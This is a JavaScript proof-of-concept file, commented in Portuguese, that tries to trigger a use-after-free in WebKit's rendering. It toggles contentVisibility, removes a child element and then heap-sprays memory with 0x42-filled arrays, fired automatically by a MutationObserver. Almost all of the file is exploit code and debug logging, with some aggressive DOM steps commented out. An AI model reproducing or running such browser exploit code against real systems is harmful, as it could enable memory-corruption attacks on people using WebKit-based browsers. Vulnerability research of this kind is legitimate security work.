// js/uaf_webkit_poc/poc.js
import { debug_log } from './module/utils.mjs'; // Continuaremos usando para logs pós-recuperação

let uafCoreLogicHasRun = false;

function heapSpray(forDiag = false) { // Adicionado parâmetro para controle
  let spray = [];
  // REDUZIR DRASTICAMENTE PARA DIAGNÓSTICO DO PONTO DE CONGELAMENTO
  const sprayIterations = forDiag ? 100 : 10000; // Apenas 100 para diagnóstico, 10000 para tentativa real
  
  const sprayPatternQWORD = [0x42, 0x42, 0x42, 0x42, 0x42, 0x42, 0x42, 0x42]; 
  
  console.log(`[POC CONSOLE] Iniciando heapSpray com ${sprayIterations} iterações...`);
  debug_log(`Iniciando heapSpray ${forDiag ? '(DIAGNÓSTICO)' : 'AGRESSIVO'} com ${sprayIterations} iterações e padrão QWORD [0x42...]...`);

  for (let i = 0; i < sprayIterations; i++) {
    let arr = new Uint8Array(0x1000); // 4KB
    for (let j = 0; j < arr.length; j++) {
      arr[j] = sprayPatternQWORD[j % sprayPatternQWORD.length];
    }
    spray.push(arr);
  }
  console.log(`[POC CONSOLE] heapSpray concluído.`);
  return spray;
}

export function triggerUAF() {
  console.log("[POC CONSOLE] triggerUAF: Início da função.");

  const currentContainer = document.querySelector(".container");

  if (!currentContainer) {
    console.error("[POC CONSOLE] triggerUAF: Elemento .container não encontrado!");
    debug_log("Erro Crítico: Elemento .container não encontrado para UAF.");
    return;
  }
  console.log("[POC CONSOLE] triggerUAF: .container encontrado.");

  // A lógica principal do UAF só roda uma vez por carregamento de página
  if (uafCoreLogicHasRun && document.getElementById('runUAFBtn') && document.getElementById('runUAFBtn').disabled) {
    console.warn("[POC CONSOLE] triggerUAF: UAF já foi tentado.");
    debug_log("UAF já foi tentado (botão desabilitado). Recarregue a página para um novo teste completo.");
    return;
  }
  console.log("[POC CONSOLE] triggerUAF: Verificação uafCoreLogicHasRun passou.");

  const currentChild = currentContainer.querySelector(".child");
  console.log(`[POC CONSOLE] triggerUAF: .child ${currentChild ? 'encontrado' : 'NÃO encontrado'}.`);

  debug_log("Iniciando tentativa de UAF (Diagnóstico Congelamento): contentVisibility=hidden...");
  console.log("[POC CONSOLE] triggerUAF: Definindo currentContainer.style.contentVisibility = 'hidden'");
  currentContainer.style.contentVisibility = "hidden";
  console.log("[POC CONSOLE] triggerUAF: contentVisibility definido para 'hidden'.");

  if (currentChild) {
    debug_log("Elemento .child encontrado, removendo-o.");
    console.log("[POC CONSOLE] triggerUAF: Removendo .child...");
    currentChild.remove();
    console.log("[POC CONSOLE] triggerUAF: .child removido.");
  } else {
    debug_log("Elemento .child já foi removido ou não encontrado inicialmente.");
    console.log("[POC CONSOLE] triggerUAF: .child não encontrado para remoção (já removido?).");
  }

  uafCoreLogicHasRun = true; 
  const uafButton = document.getElementById('runUAFBtn');
  if(uafButton) {
      uafButton.disabled = true;
      debug_log("Botão de UAF desabilitado. Recarregue a página para um novo teste completo.");
      console.log("[POC CONSOLE] triggerUAF: Botão UAF desabilitado.");
  }

  console.log("[POC CONSOLE] triggerUAF: Agendando setTimeout...");
  setTimeout(() => {
    console.log("[POC CONSOLE] setTimeout callback: Início.");
    debug_log("Continuando UAF (Diagnóstico Congelamento): contentVisibility=auto, heapSpray()...");
    
    if (document.body.contains(currentContainer)) {
        console.log("[POC CONSOLE] setTimeout: Definindo currentContainer.style.contentVisibility = 'auto'");
        currentContainer.style.contentVisibility = "auto";
        console.log("[POC CONSOLE] setTimeout: contentVisibility definido para 'auto'.");
    } else {
        console.error("[POC CONSOLE] setTimeout: Container foi removido do DOM!");
        debug_log("Container foi removido do DOM antes de contentVisibility='auto'.");
        return;
    }
    
    // Usar o spray de diagnóstico (menor)
    let sprayArrays = heapSpray(true); // true para forDiag (spray menor)
    if(sprayArrays.length > 0) {
        debug_log(`Heap spray (DIAGNÓSTICO) realizado com ${sprayArrays.length} arrays (padrão QWORD [0x42...]).`);
    }
    debug_log("Tentativa de UAF (DIAGNÓSTICO - spray leve) concluída.");
    console.log("[POC CONSOLE] setTimeout: Tentativa UAF com spray leve concluída.");

    // ##### BLOCO DE INTERAÇÕES AGRESSIVAS TEMPORARIAMENTE COMENTADO PARA DIAGNÓSTICO #####
    /*
    if (document.body.contains(currentContainer)) {
        debug_log("Iniciando interações adicionais AGRESSIVAS no container pós-UAF...");
        console.log("[POC CONSOLE] setTimeout: Iniciando interações DOM agressivas...");
        try {
            debug_log("Tentativa 1: Mudar backgroundColor e forçar offsetHeight...");
            console.log("[POC CONSOLE] DOM Aggro: Tentativa 1 - backgroundColor");
            currentContainer.style.backgroundColor = "#FF0000";
            void currentContainer.offsetHeight; 
            debug_log("Sucesso: backgroundColor e offsetHeight.");
            console.log("[POC CONSOLE] DOM Aggro: Sucesso 1");

            debug_log("Tentativa 2: Adicionar e remover tempChild com offsetHeight...");
            console.log("[POC CONSOLE] DOM Aggro: Tentativa 2 - tempChild");
            let tempChild = document.createElement('div');
            tempChild.style.width = "50px";
            tempChild.style.height = "50px";
            tempChild.style.background = "lime";
            tempChild.textContent = "New";
            currentContainer.appendChild(tempChild);
            void currentContainer.offsetHeight; 
            currentContainer.removeChild(tempChild);
            void currentContainer.offsetHeight;
            debug_log("Sucesso: tempChild adicionado/removido e offsetHeight.");
            console.log("[POC CONSOLE] DOM Aggro: Sucesso 2");

            debug_log("Tentativa 3: Modificar innerHTML e forçar offsetHeight...");
            console.log("[POC CONSOLE] DOM Aggro: Tentativa 3 - innerHTML");
            currentContainer.innerHTML += "<span>Texto Adicionado Pós-UAF</span>";
            void currentContainer.offsetHeight; 
            debug_log("Sucesso: innerHTML modificado e offsetHeight.");
            console.log("[POC CONSOLE] DOM Aggro: Sucesso 3");

            debug_log("Tentativa 4: Aplicar transform scale e forçar offsetHeight...");
            console.log("[POC CONSOLE] DOM Aggro: Tentativa 4 - transform");
            currentContainer.style.transform = "scale(1.1)";
            void currentContainer.offsetHeight; 
            currentContainer.style.transform = "scale(1.0)";
            void currentContainer.offsetHeight;
            debug_log("Sucesso: transform scale e offsetHeight.");
            console.log("[POC CONSOLE] DOM Aggro: Sucesso 4");

            debug_log("TODAS as interações adicionais AGRESSIVAS no container concluídas SEM ERRO JAVASCRIPT.");
            console.log("[POC CONSOLE] setTimeout: Interações DOM agressivas concluídas.");
        } catch(e) {
            debug_log(`ERRO JAVASCRIPT durante interações agressivas no DOM: ${e.name} - ${e.message}`);
            console.error("[POC CONSOLE] Erro DOM agressivo:", e);
        }
    } else {
        debug_log("Container não está mais no DOM para interações agressivas.");
        console.log("[POC CONSOLE] setTimeout: Container sumiu antes das interações DOM agressivas.");
    }
    */
    // ##### FIM DO BLOCO COMENTADO #####

  }, 0); // setTimeout
  console.log("[POC CONSOLE] triggerUAF: setTimeout agendado. Fim da função principal.");
}

// Configuração do MutationObserver (continua one-shot para a lógica principal)
const initialContainerForObserver = document.querySelector(".container");
if (initialContainerForObserver) {
    const observer = new MutationObserver((mutationsList, obs) => {
      if (!uafCoreLogicHasRun) { 
        console.log("[POC CONSOLE] MutationObserver: Acionado, chamando triggerUAF...");
        debug_log("MutationObserver: DOM tree modified, chamando triggerUAF (primeira vez via observer)...");
        triggerUAF();
        obs.disconnect(); 
        debug_log("MutationObserver desconectado.");
        console.log("[POC CONSOLE] MutationObserver: Desconectado.");
      } else {
        console.log("[POC CONSOLE] MutationObserver: Acionado, mas UAF já rodou. Desconectando.");
        obs.disconnect(); 
      }
    });
    observer.observe(initialContainerForObserver, { childList: true, subtree: true });
    console.log("[POC CONSOLE] MutationObserver configurado.");
} else {
    console.warn("[POC CONSOLE] Elemento .container inicial não encontrado para MutationObserver.");
}
